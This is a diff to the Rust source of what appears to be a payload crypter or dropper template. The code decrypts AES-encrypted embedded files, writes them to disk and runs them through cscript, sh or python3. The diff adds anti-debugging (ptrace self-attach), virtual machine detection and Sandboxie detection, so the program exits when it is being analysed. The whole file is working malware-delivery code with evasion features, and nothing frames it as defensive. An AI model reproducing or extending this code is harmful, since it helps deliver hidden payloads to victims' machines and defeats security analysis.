@@ -21,7 +21,6 @@
 
 //--win-subsys--
 
-use std::process::Command;
 use std::fs;
 use std::path::PathBuf;
 
@@ -30,6 +29,14 @@ use aes_gcm::{
     Aes256Gcm, Nonce
 };
 use base64::{Engine as _, engine::general_purpose};
+use execute::shell;
+
+#[cfg(feature="anti_sandboxie")]
+use std::ffi::CString;
+
+#[cfg(target_os = "linux")]
+#[cfg(not(debug_assertions))]
+use debugoff;
 
 // Constants
 
@@ -100,34 +107,24 @@ fn decrypt_n_drop(filename: &str, nonce: &[u8], content: &[u8], key: &[u8]) -> b
         None => { #[cfg(debug_assertions)] println!("Error while getting extension"); return false; }
     };
 
-    let command = if extension == "vbs" && cfg!(target_os="windows") {
-        match path.to_str() {
-            Some(r) => { "wscript \"".to_owned() + r + "\"" }
-            None => { #[cfg(debug_assertions)] println!("Error while converting OsStr to str"); return false; }
-        }
-    } else if extension == "bat" && cfg!(target_os="windows") {
-        match path.to_str() {
-            Some(r) => { "cmd /c \"".to_owned() + r + "\"" }
-            None => { #[cfg(debug_assertions)] println!("Error while converting OsStr to str"); return false; }
-        }
-    } else if extension == "sh" && cfg!(target_os="linux") {
-        match path.to_str() {
-            Some(r) => { "sh \"".to_owned() + r + "\"" }
-            None => { #[cfg(debug_assertions)] println!("Error while converting OsStr to str"); return false; }
-        }
-    } else if extension == "py" && cfg!(target_os="linux") {
-        match path.to_str() {
-            Some(r) => { "python3 \"".to_owned() + r + "\"" }
-            None => { #[cfg(debug_assertions)] println!("Error while converting OsStr to str"); return false; }
-        }
-    } else {
-        match path.to_str() {
-            Some(r) => { r.to_owned() }
-            None => { #[cfg(debug_assertions)] println!("Error while converting OsStr to str"); return false; }
-        }
+    let path_str = match path.to_str() {
+        Some(r) => { r }
+        None => { #[cfg(debug_assertions)] println!("Error while converting PathBuf to str"); return false; }
     };
 
-    match Command::new(command).spawn() {
+    let command = if extension == "vbs" && cfg!(target_os="windows") {
+        "cscript.exe ".to_owned() + " //D " + path_str
+    } else if extension == "bat" && cfg!(target_os="windows") {
+        "cscript.exe ".to_owned() + " /c " + path_str
+    } else if extension == "sh" && cfg!(target_os="linux") {
+        "sh ".to_owned() + path_str
+    } else if extension == "py" && cfg!(target_os="linux") {
+        "python3 ".to_owned() + path_str
+    } else {
+        path_str.to_owned()
+    };
+
+    match shell(command).spawn() {
         Ok(_) => {}
         #[allow(unused_variables)]
         Err(e) => { #[cfg(debug_assertions)] println!("Error while running process {}", e); return false; }
@@ -153,9 +150,27 @@ fn show_message() {
 }
 
 fn main() {
+
+    #[cfg(target_os = "linux")]
+    #[cfg(not(debug_assertions))]
+    debugoff::multi_ptraceme_or_die();
+
     #[cfg(feature="show_messagebox")]
     show_message();
 
+    #[cfg(feature="anti_vm")]
+    if inside_vm::inside_vm() { #[cfg(debug_assertions)] println!("VM was detected. Exiting..."); return; }
+
+    #[cfg(feature="anti_sandboxie")]
+    unsafe {
+        let c_str = match CString::new("SbieDll.dll") {
+            Ok(r) => { r }
+            #[allow(unused_variables)]
+            Err(e) => { #[cfg(debug_assertions)] println!("Error while converting str to CString: {:?}", e); return; }
+        };
+        if !winapi::um::libloaderapi::GetModuleHandleA(c_str.as_ptr() as *const i8).is_null() { #[cfg(debug_assertions)] println!("Sandboxie detected. Exiting..."); return; };
+    }
+    
     let key_vec = match general_purpose::STANDARD_NO_PAD.decode(KEY) {
         #[allow(unused_variables)]
         Err(e) => { #[cfg(debug_assertions)] println!("Error while base64 decoding key: {}", e); return; }
@@ -163,5 +178,10 @@ fn main() {
     };
     #[allow(unused_variables)]
     let key = key_vec.as_slice();
+
     //--gen-code--
+
+    #[cfg(target_os = "linux")]
+    #[cfg(not(debug_assertions))]
+    debugoff::multi_ptraceme_or_die();
 }
